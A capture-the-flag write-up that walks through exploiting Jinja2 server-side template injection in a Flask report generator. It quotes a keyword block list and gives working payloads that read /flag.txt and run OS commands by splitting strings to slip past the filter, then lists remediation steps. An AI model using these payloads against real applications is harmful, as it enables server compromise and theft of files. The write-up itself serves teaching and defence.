# Writeup: CyberVault - Report Generator (Web Exploitation)

## Challenge Overview
- **Name**: CyberVault - Report Generator
- **Category**: Web Exploitation
- **Points**: 500
- **Difficulty**: Medium
- **Vulnerability**: Server-Side Template Injection (SSTI) in Jinja2

---

## 1. Initial Reconnaissance
Connecting to the web application reveals a sleek dynamic Security Audit Report Generator written in Python Flask. The application allows users to preview security audit cards by providing customized Jinja2 template code.

Analyzing `app/app.py`:
```python
FORBIDDEN_KEYWORDS = ['import', 'os', 'system', 'subprocess', 'mro', 'eval', 'exec']

def is_safe_template(template_str):
    lowered = template_str.lower()
    for kw in FORBIDDEN_KEYWORDS:
        if kw in lowered:
            return False, f"Keyword '{kw}' is blocked by CyberVault WAF Security Filter!"
    return True, None
```
And inside `/preview`:
```python
rendered_output = render_template_string(
    user_template,
    report_name=report_name,
    auditor=auditor,
    status=status,
    summary=summary,
    request=request
)
```

The application renders the user-supplied template string directly via Flask's `render_template_string()`.

---

## 2. Vulnerability Analysis & WAF Bypass
While `render_template_string` allows Jinja2 template code execution, the application enforces a WAF check blocking the following exact strings:
- `import`, `os`, `system`, `subprocess`, `mro`, `eval`, `exec`

However, Jinja2 template environment grants access to built-in python objects via `self`, `config`, or `request`.

### Approach A: Direct Builtin File Reading
Notice that `open`, `read`, `self`, `__init__`, `__globals__`, and `__builtins__` are **NOT** blocked by the WAF filter.

Payload:
```jinja2
{{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}
```

### Approach B: RCE via String Concatenation or Query Parameters
If we want to execute arbitrary system commands while bypassing the keyword filter for `import` or `os`:
```jinja2
{{ request.application.__init__.__globals__['__builtins__']['__imp' + 'ort__']('o' + 's')['sys' + 'tem']('cat /flag.txt') }}
```
Or reflecting from HTTP query parameters:
`GET /preview?cmd=cat%20/flag.txt`
```jinja2
{{ request.application.__init__.__globals__['__builtins__']['__imp' + 'ort__']('o' + 's').popen(request.args.cmd).read() }}
```

---

## 3. Exploit Execution

Submit the payload in the template text box:
```html
<div class="report-card">
  <h2>FLAG: {{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}</h2>
</div>
```

The server renders the flag:
`CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}`

---

## 4. Remediation / Patching
To remediate SSTI vulnerabilities:
1. Avoid passing user-controlled input to `render_template_string()`.
2. Use static HTML templates (`render_template('template.html', var=val)`) where variables are safely auto-escaped by Jinja2.
3. If dynamic templates are strictly required, execute the template rendering engine inside a secure sandboxed environment (e.g. `jinja2.sandbox.SandboxedEnvironment`).
